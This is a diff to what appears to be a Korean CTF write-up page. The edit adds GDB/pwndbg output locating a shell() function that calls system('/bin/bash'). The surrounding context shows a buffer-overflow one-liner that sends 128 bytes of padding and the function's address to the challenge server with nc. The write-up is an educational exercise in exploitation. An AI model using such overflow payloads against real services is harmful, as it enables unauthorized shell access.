@@ -30,7 +30,12 @@
 0x08048505 &lt;+56&gt;:	mov    eax,DWORD PTR [ebp-0xc]
 0x08048508 &lt;+59&gt;:	call   eax
 </code></pre>
-<p>프로그램에 system("/bin/bash") 를 호출하는 <code>shell()</code> 이라는 함수가 있다는 것을 IDA로 확인했다.</p>
+<p>프로그램에 system("/bin/bash") 를 호출하는 <code>shell()</code> 이라는 함수가 있다는 것을 IDA로 확인했다.<br>
+또는 GDB로도 주소를 확인 할 수 있다.</p>
+<pre><code>pwndbg&gt; p shell
+$1 = {&lt;text variable, no debug info&gt;} 0x804849b &lt;shell&gt;
+</code></pre>
+<p>.</p>
 <pre><code>(python -c 'print "A" * 128 + "\x9b\x84\x04\x08"'; cat) | nc ctf.j0n9hyun.xyz 3001
 </code></pre>
 
